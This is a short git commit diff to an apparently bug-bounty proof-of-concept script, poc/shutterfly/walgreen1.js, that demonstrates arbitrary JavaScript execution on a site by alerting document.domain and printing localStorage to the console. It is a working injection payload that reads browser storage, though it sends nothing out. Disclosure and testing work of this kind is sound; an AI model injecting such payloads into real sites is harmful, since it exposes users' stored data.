9afc627d0f492a68982b65e577e601d90a39e33a
Khara-h1 <117389489+Khara-h1@users.noreply.github.com>
2024-01-11 16:05:41 +0100

    Update walgreen1.js

--- poc/shutterfly/walgreen1.js
+++ poc/shutterfly/walgreen1.js
@@ -1,1 +1,6 @@
+
+console.log(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> ");
+console.log(">>>>>> Kharaone, PoC for arbitrary JS execution on " + document.domain);
+console.log(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>");
 alert(document.domain);
+console.log((localStorage));
